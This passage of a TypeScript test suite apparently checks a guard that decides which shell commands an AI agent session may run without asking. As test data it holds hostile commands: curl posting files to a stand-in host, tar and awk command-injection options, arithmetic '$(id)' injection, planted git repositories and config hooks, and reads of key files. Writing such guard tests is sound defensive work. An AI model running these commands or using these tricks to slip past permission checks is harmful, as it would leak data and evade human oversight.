    "git add -A\ngit commit -m x",
    "\ngit status\n\ngit add -A &&\ngit commit -m x\n",
    "git add src/*.ts",
    "git add -f src/[ab].ts -- ./*.md",
    "git rm --cached src/*.ts",
    "git mv src/*.ts lib/",
    "git restore --staged src/*.ts",
    "git commit -m \"feat!: x\"",
    "git commit -m x\n",
    "GIT_EDITOR=true git rebase --continue",
    "GIT_SEQUENCE_EDITOR=: git rebase --continue",
    "GIT_EDITOR=true git cherry-pick --continue",
    "GIT_MERGE_AUTOEDIT=no git merge feature",
    "GIT_EDITOR=true git commit --amend --no-edit",
    "git commit -m \"$(cat <<'EOF'\nfix: two steps\n\n1) first\n2) second\nEOF\n)\"",
    "git commit -m \"$(cat <<'EOF'\nfix: an unmatched ( here\nEOF\n)\" && git push",
    "git commit -m \"$(cat <<'EOF'\nbody with `id`, $(id), \\ and \" in it\nEOF\n)\"",
    "git commit -m \"$(cat <<EOF\nfix: unquoted delimiter\nEOF\n)\"",
    "git commit -m \"$(cat <<\"EOF\"\nfix: double-quoted delimiter\nEOF\n)\"",
  ]) test(`r3 13: git-only: ${JSON.stringify(c)}`, () => assert.ok(gitOnly(c)));
  for (const c of [
    "git add -- -x*",
    "git add *",
    "git add *.ts",
    "git add .[a-z]*",
    "git add :!x*",
    "git add 'src/*.ts' && ./x",
    "git commit -m x src/*.ts",
    "git checkout src/*.ts",
    "git restore -s src/*.ts x",
    "git add --pathspec-from-file src/*.txt",
    "git add -A\ngit commit -m \"$(echo\nx)\"",
    "git commit -m \"$(cat <<EOF\n$(id)\nEOF\n)\"",
    "git commit -m \"$(cat <<EOF\na \\\\ b\nEOF\n)\"",
    "git commit -m \"$(cat <<EOF\n`id`\nEOF\n)\"",
    "git commit -m \"$(cat <<'EOF'\nx\nEOF\n); id\"",
    "git commit -m 'a\"$(cat <<'EOF'\nx' ; touch x ; echo '\nEOF\n)\"'",
    "git commit -m \"x\" &&",
    "git add -A &&\n",
    "git add src/*.ts\n# c",
    "git add -A\r\ngit commit -m x",
    "git commit -m \"a $x\"",
    "GIT_EDITOR=vim git rebase --continue",
    "GIT_EDITOR='sh -c x' git rebase --continue",
    "'GIT_EDITOR=true' git rebase --continue",
    "GIT_EDITOR=true git push",
    "GIT_EDITOR=true git rebase -i main",
    "GIT_EDITOR=true git rebase main",
    "GIT_DIR=x git status",
    "GIT_EDITOR=true cd x",
  ]) test(`r3 13: not git-only: ${JSON.stringify(c)}`, () => assert.ok(!gitOnly(c)));
  expect("allow", [
    "GIT_EDITOR=true git rebase --continue",
    "GIT_SEQUENCE_EDITOR=: git rebase --continue",
    "git commit -m \"$(cat <<'EOF'\nfix: two steps\n\n1) first\n2) second\nEOF\n)\"",
    "git commit -m \"$(cat <<'EOF'\nfix: an unmatched ( here\nEOF\n)\"",
  ]);
  expect("ask", [
    "GIT_EDITOR=vim git rebase --continue",
    "GIT_EDITOR='sh -c x' git rebase --continue",
    "GIT_EDITOR=true npm test",
    "GIT_EDITOR=true GIT_DIR=x git rebase --continue",
    "GIT_EDITOR=true: git rebase --continue",
    "export GIT_EDITOR=true; git rebase --continue",
    // An unmatched parenthesis in a heredoc message of a call that is not git-only: the rules'
    // parser could read the commands after it differently, so the scanner still asks.
    "git commit -m \"$(cat <<'EOF'\n) \"\nEOF\n)\"; touch x",
    "echo \"$(cat <<'EOF'\n(\nEOF\n)\"",
  ]);

  // 14: a `$` bash does not expand names no file; a loop over a glob names the files it matches.
  expect("allow", [
    "awk '{print $1}' f",
    "sed -n '5,$p' f",
    "grep 'foo$' f",
    "rg 'TODO$'",
    "jq --arg v x 'select(.a == $v)' data.json",
    "cat '$HOME'",
    "for f in *.ts; do head -3 \"$f\"; done",
    "for f in src/*.ts; do head -3 $f; done",
    "for f in *.ts\ndo\n  wc -l \"$f\"\n  head -5 \"$f\"\ndone",
    "for f in dir/*.md; do cat \"${f}\"; done",
    "for d in src dir; do for f in $d; do ls; done; done",
    "cd dir && cat *.md",
    "cd dir && for f in *.md; do head -1 \"$f\"; done",
  ]);
  expect("classify", [
    "awk \"{print $1}\" f",
    "sed -n \"$x\" f",
    "cat \"$f\"",
    "head -5 $f",
    "for f in *.ts; do :; done; cat \"$f\"",
    "(for f in *.ts; do :; done); cat \"$f\"",
    "for f in *.ts; do :; done | cat; cat \"$f\"",
    "for f in *.ts; do f=x; cat \"$f\"; done",
    "for f in *.ts; do read f; cat \"$f\"; done",
    "for f in *.ts; do cat \"$f\" \"$g\"; done",
    "for f in \"$@\"; do cat \"$f\"; done",
    "for f in $(ls); do cat \"$f\"; done",
    "for f in *.ts; do bash -c 'cat \"$f\"'; done",
    "for f in *.ts; do cat \"$f.bak\"; done",
    "for f in *.ts; do cat \"${f%.ts}\"; done",
    "for f in *.ts; do cat \"$f\"; done; for f in x; do :; done",
    "while read f; do cat \"$f\"; done < list",
    "cd \"$D\" && cat *.md",
    // A bracket with a range out of order: no pattern to match files with (seed 202 crashed here).
    "grep 'x[z-a]$' f",
    "cat 'a[&-#]$'",
  ]);
  // A loop's glob that matches a file whose name starts with `-`, or a credential file.
  expect("ask", ["for f in *.ts; do head -3 \"$f\"; done", "for f in *; do cat \"$f\"; done", "cat *.ts"], () => dashed);
  expect("ask", ["for f in keys/*; do cat \"$f\"; done", "for f in keys/*.key; do head -1 $f; done", "cd keys && cat *"], () => secret);
  expect("allow", ["for f in keys/*.md; do cat \"$f\"; done"], () => secret);

  // 15: the place git creates a repository at, with option values skipped.
  for (const [command, where] of [
    ["git clone git@github.com:o/r.git", "r"],
    ["git clone https://github.com/o/r.git/", "r"],
    ["git clone https://github.com/o/r/.git", "r"],
    ["git clone --bare https://github.com/o/r.git", "r.git"],
    ["git clone --mirror ssh://git@host:2222/o/r", "r.git"],
    ["git clone -q --depth=1 --branch main https://github.com/o/r", "r"],
    ["git clone -qb main https://github.com/o/r.git", "r"],
    ["git clone -o up -c a.b=c https://github.com/o/r.git d", "d"],
    ["git clone --recurse-submodules=x https://github.com/o/r.git", "r"],
    ["git clone -- https://github.com/o/r.git -x", "-x"],
    ["git init --bare -q x", "x"],
    ["git init", "."],
    ["git init --initial-branch=main", "."],
    ["git -C sub init y", "sub/y"],
    ["git worktree add --detach wt HEAD", "wt"],
    ["git worktree --quiet add -B feat wt", "wt"],
    ["git submodule add -b main --name n https://github.com/o/r.git", "r"],
    ["git submodule --quiet add https://github.com/o/r.git", "r"],
    // As git 2.47 names them (probed): the host, without a port.
    ["git clone https://github.invalid/", "github.invalid"],
    ["git clone https://u@github.invalid:8080/", "github.invalid"],
  ] as [string, string][]) {
    test(`r3 15: ${command} is expected at ${where}`, () => {
      const dir = fixture("r3e-15-", ["sub/.keep"]);
      assert.equal(expectedRepos(command, dir)?.[0], path.join(dir, where));
    });
  }
  for (const command of [
    "git clone --dep 1 https://github.com/o/r.git",
    "git clone --separate-git-dir=../g https://github.com/o/r.git",
    "git init --separate-git-dir ../g x",
    "git clone --unknown-option https://github.com/o/r.git",
    "git clone -Z https://github.com/o/r.git",
    "git clone --bare=x https://github.com/o/r.git",
    "git worktree -f add wt",
  ]) test(`r3 15: nothing is expected for ${command}`, () => assert.equal(expectedRepos(command, plain), undefined));
  test("r3 15: a bundle file is named without .bundle", () => {
    const dir = fixture("r3e-15b-", ["r.bundle"]);
    assert.deepEqual(expectedRepos("git clone r.bundle", dir), [path.join(dir, "r")]);
    assert.equal(urlBasename("r.bundle", false, false), "r.bundle");
    assert.equal(urlBasename("host:2222", false, false), "host");
    assert.equal(urlBasename("a:b.git", false, false), "b");
    assert.equal(urlBasename("https://u@host/x  ", false, false), "x");
  });

  // 17: only a helper that matches one of the remote's URLs.
  test("r3 17: a helper scoped to another host does not ask", async () => {
    const dir = fixture("r3e-17-", []);
    execFileSync("git", ["-C", dir, "remote", "add", "origin", "https://github.com/o/r.git"]);
    execFileSync("git", ["-C", dir, "config", "credential.https://gitlab.example.invalid.helper", "store"]);
    const s = new SessionState(dir);
    await decideShell(guard, s, dir, "ls");
    assert.equal(sandboxBreaks("git fetch origin", dir, s), undefined);
    execFileSync("git", ["-C", dir, "config", "credential.https://github.com/o.helper", "store"]);
    assert.match(sandboxBreaks("git fetch origin", dir, s) ?? "", /credential helper/);
  });

  // 27: git commands that write inside .git are git-only, or ask; signing asks.
  for (const c of ["git remote update", "git remote prune origin", "git bisect start", "git bisect good", "git bisect reset", "git apply --index p.diff", "git apply --3way p.diff", "git symbolic-ref HEAD refs/heads/main", "git status && git bisect start"])
    test(`r3 27: git-only: ${c}`, () => assert.ok(gitOnly(c)));
  for (const c of ["git bisect visualize", "git bisect replay log", "git bisect run make", "git apply --index --unsafe-paths p.diff", "git apply --build-fake-ancestor=x p.diff", "git remote set-branches origin x", "git update-ref refs/heads/x HEAD", "git am x.mbox", "git worktree prune", "git replace a b", "git rerere forget x"])
    test(`r3 27: not git-only: ${c}`, () => assert.ok(!gitOnly(c)));
  test("r3 27: writers that are not git-only ask; readers do not", async () => {
    const dir = fixture("r3e-27-", []);
    const s = new SessionState(dir);
    await decideShell(guard, s, dir, "ls");
    for (const c of ["git update-ref refs/heads/x HEAD", "git commit-tree HEAD^{tree} -m x", "git hash-object -w f", "git read-tree HEAD", "git worktree prune", "git bisect visualize", "git remote set-branches origin x", "git apply --index p.diff && ls", "git symbolic-ref HEAD refs/heads/x && ls", "git remote update && ls", "git fsck --lost-found", "git maintenance run"])
      assert.match(sandboxBreaks(c, dir, s) ?? "", /read-only/, c);
    for (const c of ["git symbolic-ref HEAD", "git apply --check p.diff", "git apply p.diff && ls", "git remote -v", "git bisect log", "git hash-object f", "git worktree list", "git tag -l", "git tag --contains HEAD"])
      assert.equal(sandboxBreaks(c, dir, s), undefined, c);
  });
  test("r3 27: signing asks: tag.gpgSign, tag.forceSignAnnotated, -S, rebase.gpgSign, push.gpgSign", async () => {
    const dir = fixture("r3e-27s-", []);
    const s = new SessionState(dir);
    await decideShell(guard, s, dir, "ls");
    const withKey = (key: string, value: string, fn: () => void) => {
      execFileSync("git", ["-C", dir, "config", key, value]);
      try {
        fn();
      } finally {
        execFileSync("git", ["-C", dir, "config", "--unset", key]);
      }
    };
    for (const c of ["git tag v1", "git tag -a v1 -m x", "git merge -S x", "git rebase -S main", "git cherry-pick --gpg-sign x", "git revert -S HEAD", "git push --signed", "git push --signed=if-asked"])
      if (/-S|--gpg-sign|--signed/.test(c)) assert.match(sandboxBreaks(c, dir, s) ?? "", /sign/, c);
    assert.equal(sandboxBreaks("git tag -a v1 -m x", dir, s), undefined);
    assert.equal(sandboxBreaks("git push --no-signed", dir, s), undefined);
    withKey("tag.gpgSign", "true", () => {
      assert.match(sandboxBreaks("git tag v1", dir, s) ?? "", /sign/);
      assert.equal(sandboxBreaks("git tag -d v1", dir, s), undefined);
      assert.equal(sandboxBreaks("git tag -l", dir, s), undefined);
    });
    withKey("tag.forceSignAnnotated", "true", () => {
      assert.match(sandboxBreaks("git tag -a v1 -m x", dir, s) ?? "", /sign/);
      assert.match(sandboxBreaks("git tag v1 -m x", dir, s) ?? "", /sign/);
      assert.equal(sandboxBreaks("git tag v1", dir, s), undefined);
    });
    withKey("rebase.gpgSign", "true", () => assert.match(sandboxBreaks("git rebase main", dir, s) ?? "", /sign/));
    withKey("push.gpgSign", "if-asked", () => assert.match(sandboxBreaks("git push", dir, s) ?? "", /sign/));
    withKey("push.gpgSign", "false", () => assert.equal(sandboxBreaks("git push", dir, s), undefined));
    withKey("merge.verifySignatures", "true", () => assert.match(sandboxBreaks("git merge x", dir, s) ?? "", /signature/));
  });
  test("r3 27: git remote update with an ssh remote needs the agent, so it asks", async () => {
    const dir = fixture("r3e-27r-", []);
    execFileSync("git", ["-C", dir, "remote", "add", "origin", "git@example.invalid:o/r.git"]);
    const s = new SessionState(dir);
    await decideShell(guard, s, dir, "ls");
    assert.match(sandboxBreaks("git remote update", dir, s) ?? "", /ssh agent/);
    assert.match(sandboxBreaks("git remote show origin", dir, s) ?? "", /ssh agent/);
    assert.equal(sandboxBreaks("git remote -v", dir, s), undefined);
  });

  // Also-list: the default ask rule for `git -c` looks at git's own options only.
  test("r3 E (also): the git -c ask rule matches git's -c, not a subcommand's", () => {
    const rules = compileRules({ ask: DEFAULT_ASK });
    const asks = (t: string) => rules.ask.some((m) => m.test(t));
    for (const t of ["git -c core.sshCommand=x fetch", "git -C . -c alias.x=!id x", "git -c user.name=a -c core.pager=x log", "git --no-pager -c diff.external=x diff", "git -C x -c core.fsmonitor=y status"]) assert.ok(asks(t), t);
    for (const t of ["git switch -c fix/x", "git -c user.name=a status", "git grep -c foo", "git -c color.ui=never switch -c fix/y", "git diff -c HEAD"]) assert.ok(!asks(t), t);
  });
  test("r3 27: git tag -n lists", async () => {
    const dir = fixture("r3e-27n-", []);
    const s = new SessionState(dir);
    await decideShell(guard, s, dir, "ls");
    assert.equal(sandboxBreaks("git tag -n5 && ls", dir, s), undefined);
    assert.match(sandboxBreaks("git tag v9 && ls", dir, s) ?? "", /read-only/);
  });

  // 29: known global options before a package manager's subcommand.
  expect("allow", [
    "pnpm --filter web test",
    "pnpm -F web test",
    "pnpm -r --filter=web test",
    "pnpm -C web build",
    "npm --prefix web run build",
    "npm --prefix=web test",
    "npm -w web test",
    "npm --silent run build",
    "yarn --cwd web test",
    "cargo -q build",
    "cargo --locked -q test",
    "cargo +nightly build",
    "go -C dir test",
    "timeout 60 pnpm --filter web test",
    "cd web && npm --prefix . test",
  ]);
  expect("ask", [
    "npm --foo test",
    "npm --prefix /etc run x",
    "npm --prefix .. run build",
    "npm --prefix \"$D\" test",
    "npm --prefix web install",
    "pnpm --filter web add left-pad",
    "pnpm --filter web publish",
    "npm --script-shell=x test",
    "npm --prefix web --script-shell=x test",
    "npm test --script-shell=x",
    "cargo --config x=y build",
    "cargo -q --config x=y build",
    "cargo -Z unstable build",
    "go -C dir -toolexec x test",
    "go -exec x test",
    "yarn --cwd web",
    "npm --prefix web run build > ~/.bashrc",
  ]);
  expect("ask", ["pnpm --filter web exec ls", "pnpm -F web dlx x", "for f in *.ts; do cat \"${!f}\"; done"]);

  // 30: keys tools write into ordinary repositories.
  for (const [key, value] of [["branch.main.t3-merge-base", "origin/main"], ["branch.main.t3-merge-base-ref", "refs/heads/main"], ["branch.main.gh-merge-base", "main"], ["branch.main.vscode-merge-base-ref", "origin/main"], ["lfs.https://example.invalid/team/x.git/info/lfs.locksverify", "true"], ["lfs.https://example.invalid/team/x.git/info/lfs.access", "basic"], ["core.sharedRepository", "group"]])
    test(`r3 30: the ordinary repository key ${key} keeps the ssh agent`, () => {
      const dir = fixture("r3e-30-", []);
      execFileSync("git", ["-C", dir, "remote", "add", "origin", "git@example.invalid:team/x.git"]);
      execFileSync("git", ["-C", dir, "config", key, value]);
      assert.ok(usesSsh("git fetch origin", dir, new SessionState(dir)));
    });
  for (const [key, value] of [["lfs.url", "ssh://git@elsewhere.invalid/x"], ["lfs.pushurl", "https://elsewhere.invalid/x"], ["filter.lfs.process", "git-lfs filter-process"], ["vp.hooks.dir", ".vp"], ["remote.origin.pushurl", "git@elsewhere.invalid:x"], ["branch.main.pushremote", "other"]])
    test(`r3 30: the repository key ${key} still takes the ssh agent away`, () => {
      const dir = fixture("r3e-30n-", []);
      execFileSync("git", ["-C", dir, "remote", "add", "origin", "git@example.invalid:team/x.git"]);
      execFileSync("git", ["-C", dir, "config", key, value]);
      assert.ok(!usesSsh("git fetch origin", dir, new SessionState(dir)));
    });
});

// Round 3, group A: decisions the scanner changes. Before, each "ask" here was a rule allow (or
// was left to the model) while bash ran what the rules had not read.
describe("r3 A: variables in arithmetic, nested shells, shell options", () => {
  // 6: bash evaluates a variable's value as code wherever arithmetic names it. `ls` is a name
  // the rules allow as a command, so these were rule allows.
  expectEffect("ask", [
    "ls='a[b[0]+$(id)]'; (( ls ))",
    "a='$(id)'; ls=\"b[$a]\"; (( ls ))",
    "ls='x'; echo $(( ls ))",
    "(( ls ))",
    "echo $(( ls + 1 ))",
    "ls=0; read ls < f; (( ls ))",
    "ls=0; for ls in a b; do (( ls )); done",
    "ls=0; printf -v ls %s x; (( ls ))",
    "true && ls=0; (( ls ))",
    "( ls=0 ); (( ls ))",
    "(( ls )); ls=0",
    "ls=0; ls='a[b[0]+$(id)]'; (( ls ))",
    "ls='x'; [[ $ls -eq 1 ]]",
    "ls='x'; a[ls]=1",
  ]);
  // Set to a plain integer first, where every run reaches it: the name holds no code.
  expectEffect("allow", ["ls=0; (( ls ))", "ls=0; echo $(( ls + 1 ))"]);
  // A counter with a name of its own is no command the rules know: still the model's.
  expectEffect("classify", ["i=0; (( i++ ))", "for ((i=0; i<3; i++)); do echo $i; done", "for ((ls=0; ls<2; ls++)); do true; done"]);

  // Item 3 (finding 37): zsh and ksh do not read code the way bash does.
  expectEffect("ask", [
    "zsh -c '{ ls } always { id }'",
    "zsh -c 'ls'",
    "timeout 5 zsh -c 'ls'",
    "env zsh -c 'ls'",
    "echo x | xargs zsh -c 'ls'",
    "/usr/bin/zsh -c 'ls'",
    "zsh -fc 'ls'",
    "ksh -c 'ls'",
    "fish -c 'ls'",
    "bash -c 'zsh -c ls'",
  ]);
  expectEffect("allow", ["bash -c 'ls'", "sh -c 'ls -la'", "bash -lc 'git status'", "timeout 5 bash -c 'ls'", "bash -euo pipefail -c 'ls'"]);

  // 4, and what is next to it: options that change how bash reads the rest.
  expectEffect("ask", [
    "shopt -s extglob\nls",
    "bash -O extglob -c 'ls'",
    "bash -i -c 'ls'",
    "env BASHOPTS=extglob bash -c 'ls'",
    "env SHELLOPTS=history:histexpand bash -c 'ls'",
    "POSIXLY_CORRECT=1; ls",
    "set -o history -H\nls",
    "bash build.sh -c true",
  ]);
  expectEffect("allow", ["set -euo pipefail; ls", "set -e\nls", "npm run build && \\\nnpm test", "npm run build &&\\\nnpm test", "echo a |\\\n cat"]);
  // 1: a backslash-newline anywhere but straight after a blank, or after `&&`, `||` or `|`
  // before a plain word.
  expectEffect("ask", ["echo \"a \\\n b\"", "echo a\\\nb", "echo a &\\\n& cat", "echo a |\\\n| cat", "npm run build &&\\\n#x\nnpm test"]);
});

// Round 3, group B: trust granted on the wrong thing. Each test was red on the code it fixes.
describe("r3 B: trust is granted on what will run", () => {
  const withGlobal = async (text: string, fn: () => Promise<void> | void) => {
    const global = process.env.GIT_CONFIG_GLOBAL!;
    const before = fs.readFileSync(global, "utf8");
    fs.writeFileSync(global, before + text);
    try {
      await fn();
    } finally {
      fs.writeFileSync(global, before);
    }
  };
  // A checkout of its own with one commit on feature/x, an origin and an upstream.
  const project = (prefix: string, origin: string, parent = tmp) => {
    const dir = fs.realpathSync(fs.mkdtempSync(path.join(parent, prefix)));
    const run = (...args: string[]) => execFileSync("git", ["-C", dir, ...args], { stdio: ["ignore", "pipe", "pipe"] });
    run("init", "-q", "-b", "main");
    run("-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "init");
    run("checkout", "-q", "-b", "feature/x");
    run("remote", "add", "origin", origin);
    run("config", "branch.feature/x.remote", "origin");
    run("config", "branch.feature/x.merge", "refs/heads/feature/x");
    return dir;
  };

  // 7: the session plants a bare repository at <dir>/~/<project> and names it as `~'/<project>'`;
  // the plugin checked the real project under $HOME and gave the ssh agent.
  test("r3 7: a ~ that bash does not expand gives no ssh agent", () => {
    const home = os.homedir();
    const proj = project("r3-7-", "git@example.invalid:team/x.git", home);
    const name = path.basename(proj);
    const planted = fs.realpathSync(fs.mkdtempSync(path.join(tmp, "r3-7-planted-")));
    execFileSync("git", ["init", "-q", "--bare", path.join(planted, "~", name)]);
    const s = () => new SessionState(proj);
    try {
      assert.ok(usesSsh(`git -C ~/${name} fetch origin`, planted, s()), "the unquoted spelling names the project");
      for (const c of [
        `cd ${planted} && git -C ~'/${name}' fetch origin`,
        `git -C ~'/${name}' fetch origin`,
        `git -C ~"/${name}" fetch origin`,
        `git -C ''~/${name} fetch origin`,
        `git -C ""~/${name} fetch origin`,
        `git -C ~'/'${name} fetch origin`,
        `cd ~'/${name}' && git fetch origin`,
        `cd ''~/${name} && git fetch origin`,
      ]) assert.ok(!usesSsh(c, planted, s()), c);
    } finally {
      fs.rmSync(proj, { recursive: true, force: true });
    }
  });
  test("r3 7: a ~ that bash does not expand names no place for a new repository", () => {
    const dir = fs.realpathSync(fs.mkdtempSync(path.join(tmp, "r3-7e-")));
    for (const c of ["git -C ~'/x' init sub", "git init ''~/x", "cd ~'/x' && git init", "git init ~\"/x\"", "git init ~+/x", "git -C a=~/x init sub", "git clone https://example.invalid/r.git ~'/x'"]) assert.equal(expectedRepos(c, dir), undefined, c);
    assert.deepEqual(expectedRepos("git init ~/x", dir), [path.join(os.homedir(), "x")]);
  });
  test("r3 7: a core.hooksPath git expands with another user's home cannot be checked, so no agent", async () => {
    await withGlobal(`[core]\n\thooksPath = ~${os.userInfo().username}/r3-no-such-hooks\n`, () => assert.ok(!usesSsh("git fetch origin", repo, new SessionState(repo))));
    assert.ok(usesSsh("git fetch origin", repo, new SessionState(repo)));
  });

  // 19: origin fetches from A (default main) and pushes to B (default feature/topic).
  test("r3 19: the default branch is asked of the URL the push goes to", async () => {
    const b = path.join(tmp, "r3-19-b.git");
    execFileSync("git", ["init", "-q", "--bare", "-b", "feature/topic", b]);
    git("push", "-q", sshUrl(b), "HEAD:refs/heads/feature/topic");
    const command = "git push origin HEAD:refs/heads/feature/topic";
    assert.equal(await effect(command), "allow", "to A, feature/topic is an ordinary branch");
    await withGlobal(`[remote "origin"]\n\tpushurl = ${sshUrl(b)}\n`, async () => {
      const d = await decide(command);
      assert.equal(d.effect, "ask", d.reason);
    });
  });

  // 20: a remote whose path did not exist when the session started; the session builds a bare
  // repository there whose receive-pack runs a command. No git may start in it before the decision.
  const localRemotes: [string, (p: string, dir: string) => string, string?][] = [
    ["an absolute path", (p) => p],
    ["a file:// URL", (p) => `file://${p}`],
    ["a relative path", (p, dir) => path.relative(dir, p)],
    ["a path through ./", (p, dir) => `./${path.relative(dir, p)}`],
    ["an ssh URL that pushInsteadOf turns into a path", () => "ssh://automode-test.invalid/r3-20-rewritten", "pushInsteadOf"],
  ];
  for (const [what, url, rewrite] of localRemotes) {
    test(`r3 20: no git runs in a remote that is ${what} before the decision`, async () => {
      const p = path.join(tmp, `r3-20-${Math.random().toString(36).slice(2)}.git`);
      const marker = `${p}.ran`;
      const work = fs.realpathSync(fs.mkdtempSync(path.join(tmp, "r3-20-")));
      const dir = project("p-", "placeholder", work);
      execFileSync("git", ["-C", dir, "remote", "set-url", "origin", url(p, dir)]);
      const go = async () => {
        const s = new SessionState(dir);
        assert.equal((await decideShell(guard, s, dir, "ls")).effect, "allow");
        // Built after the session started, as a sandboxed command could.
        execFileSync("git", ["init", "-q", "--bare", p]);
        fs.mkdirSync(path.join(p, "objects", "info"), { recursive: true });
        fs.writeFileSync(path.join(p, "objects", "info", "alternates"), path.join(remote, "objects") + "\n");
        execFileSync("git", ["-C", p, "config", "core.alternateRefsCommand", `touch '${marker}'; true`]);
        const d = await decideShell(guard, s, dir, "git push origin feature/x");
        assert.equal(d.effect, "ask", d.reason);
        assert.ok(!fs.existsSync(marker), "git ran in the remote before the decision");
      };
      if (rewrite) await withGlobal(`[url "${p}"]\n\t${rewrite} = ssh://automode-test.invalid/r3-20-rewritten\n`, go);
      else await go();
    });
  }
  // The dry run would push each submodule too, to remotes from the submodules' own config.
  for (const setting of ["[push]\n\trecurseSubmodules = on-demand\n", "[push]\n\trecurseSubmodules = check\n", "[submodule]\n\trecurse = true\n"]) {
    test(`r3 20: a push that recurses into submodules is not dry-run: ${JSON.stringify(setting)}`, async () => {
      await withGlobal(setting, async () => assert.equal(await effect("git push"), "ask"));
    });
  }
  test("r3 20: no transport helper runs before the decision", async () => {
    const marker = path.join(tmp, "r3-20-helper.ran");
    fs.writeFileSync(path.join(bin, "git-remote-automodetest"), `#!/bin/sh\ntouch '${marker}'\nexit 1\n`, { mode: 0o755 });
    const dir = project("r3-20h-", "automodetest::somewhere");
    const s = new SessionState(dir);
    await decideShell(guard, s, dir, "ls");
    assert.equal((await decideShell(guard, s, dir, "git push origin feature/x")).effect, "ask");
    assert.ok(!fs.existsSync(marker), "the helper ran before the decision");
  });
  test("r3 20: the plugin's own network git runs with no controlling terminal and ssh in batch mode", async () => {
    fs.writeFileSync(sshLog, "");
    assert.equal(await effect("git push"), "allow");
    const log = fs.readFileSync(sshLog, "utf8");
    const starts = log.split("args:").slice(1);
    assert.ok(starts.length >= 2, `the dry run and the default-branch check: ${log}`);
    const ours = fs.readFileSync("/proc/self/stat", "utf8").split(" ")[5];
    for (const start of starts) {
      assert.match(start, /\[BatchMode=yes\]/, start);
      assert.match(start, /tty=no/, start);
      assert.doesNotMatch(start, new RegExp(`sid=${ours}\\b`), `ssh runs in the plugin's session, where a terminal could be: ${start}`);
      assert.match(start, /askpass=\[\] require=\[never\]/, start);
    }
  });

  // 21: an approved `git -C <elsewhere> submodule update` reads .gitmodules from that repository.
  test("r3 21: only declared places inside the named repository are expected", () => {
    const victim = fs.realpathSync(fs.mkdtempSync(path.join(tmp, "r3-21-victim-")));
    const evil = fs.realpathSync(fs.mkdtempSync(path.join(tmp, "r3-21-evil-")));
    execFileSync("git", ["init", "-q", evil]);
    fs.mkdirSync(path.join(evil, "real"));
    fs.symlinkSync(victim, path.join(evil, "link"));
    const up = path.relative(evil, victim);
    const paths = { ok: "vendor/lib", up, abs: victim, link: "link/sub", dotdot: "real/../../" + path.basename(victim), top: ".", missing: "nope/../vendor/x", inner: "real/../vendor/y" };
    fs.writeFileSync(path.join(evil, ".gitmodules"), Object.entries(paths).map(([n, p]) => `[submodule "${n}"]\n\tpath = ${p}\n\turl = https://example.invalid/${n}.git\n`).join(""));
    const dirs = expectedRepos(`git -C ${evil} submodule update --init`, tmp) ?? [];
    assert.ok(dirs.includes(path.join(evil, "vendor", "lib")), JSON.stringify(dirs));
    assert.ok(dirs.includes(path.join(evil, "vendor", "y")), JSON.stringify(dirs));
    for (const d of dirs) assert.ok(d.startsWith(evil + "/"), `${d} is outside ${evil}`);
    assert.ok(!dirs.some((d) => d === evil || d.startsWith(victim)), JSON.stringify(dirs));
  });
  test("r3 21: a repository whose work tree is set elsewhere expects nothing there", () => {
    const victim = fs.realpathSync(fs.mkdtempSync(path.join(tmp, "r3-21w-victim-")));
    const evil = fs.realpathSync(fs.mkdtempSync(path.join(tmp, "r3-21w-evil-")));
    execFileSync("git", ["init", "-q", evil]);
    execFileSync("git", ["-C", evil, "config", "core.worktree", victim]);
    fs.writeFileSync(path.join(victim, ".gitmodules"), `[submodule "s"]\n\tpath = src\n\turl = https://example.invalid/s.git\n`);
    const dirs = expectedRepos(`git -C ${evil} submodule update --init`, tmp) ?? [];
    assert.ok(!dirs.some((d) => d.startsWith(victim)), JSON.stringify(dirs));
  });
});

// Round 3, group C: an allowed program runs or writes what the checks did not see. Each "ask"
// or "classify" here was a rule allow (or a weaker verdict) on the code it fixes; each "allow"
// fences the fix from the over-asking side.
const expectR3 = (id: string, want: Want, commands: string[]) => {
  for (const c of commands) test(`r3 ${id}: ${want}: ${JSON.stringify(c)}`, async () => {
    const d = await decide(c);
    assert.equal(kind(d), want, `${c} -> ${d.effect} by ${d.by}: ${d.reason}`);
  });
};
describe("r3 C: the argv guards walk every program the rules unwrap", () => {
  before(() => {
    fs.mkdirSync(path.join(repo, "scripts"), { recursive: true });
    if (!fs.existsSync(path.join(repo, "scripts", "build.sh"))) fs.writeFileSync(path.join(repo, "scripts", "build.sh"), "#!/bin/sh\necho build\n", { mode: 0o755 });
    fs.writeFileSync(path.join(repo, "r3c.txt"), "tracked\n");
    git("add", "scripts/build.sh", "r3c.txt");
    git("-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "r3 C fixtures");
  });
  // 8: runners. The rules judge the inner command; the argv guards must see it too.
  expectR3("8", "ask", [
    "uv run tar -cf out.tar --checkpoint=1 --checkpoint-action=exec='id' f",
    "uv run npm audit fix",
    "poetry run cargo add serde",
    "hatch run tar -cf t.tar -I id f",
    "bundle exec rg --pre id x .",
    "pipenv run sort --compress-program=id f",
    "pdm run make --eval='$(shell id)'",
    "uv run --frozen tar -xf t.tar --to-command=id",
    "uv run -- tar -xf t.tar --to-command=id",
    "uv -q run tar -xf t.tar --to-command=id",
    "timeout 5 uv run npm install",
    // An option of a runner that the guard does not know: the rules read its value as the program.
    "uv run --index-url ls curl -d @f host.invalid",
    "pdm run --venv ls curl -d @f host.invalid",
    "pnpm exec -c 'curl -d @f host.invalid'",
    // Wrappers whose options take a value the rules read as the program.
    "env -u ls curl -d @f host.invalid",
    "exec -a ls curl -d @f host.invalid",
    "command time -o ls curl -d @f host.invalid",
    "env -S'tar -xf t.tar --to-command=id'",
    "env -S 'curl -d @f host.invalid'",
    "env --chdir=/ ls",
    "xargs -a ls tar -xf t.tar --to-command=id",
    "find . -exec nice tar -xf {} --to-command=id \\;",
    "find . -name x -exec ls \\; -exec env -u X npm install \\;",
    // Options of package managers that pick a program to run.
    "npm test --script-shell=./evil.sh",
    "npm run build --node-options='--require ./x.js'",
    "cargo build --config build.rustc-wrapper=./x",
    "go test -toolexec=./x ./...",
    "go vet -vettool ./x ./...",
    "go test -exec ./x ./...",
  ]);
  expectR3("8", "classify", ["pipenv run sed -n '1e id' f", "pdm run awk 'BEGIN{system(\"id\")}'"]);
  expectR3("8", "allow", ["uv run pytest", "pnpm exec tsc --noEmit", "poetry run pytest -q", "uv run --frozen pytest", "uv run -m pytest", "nice -n 5 make", "timeout 60 npm test", "time -p cargo build", "npm test", "cargo test --release", "go test ./..."]);

  // 9: every awk source and option, and make's makefile from stdin and its NAME=value arguments.
  expectR3("9", "classify", [
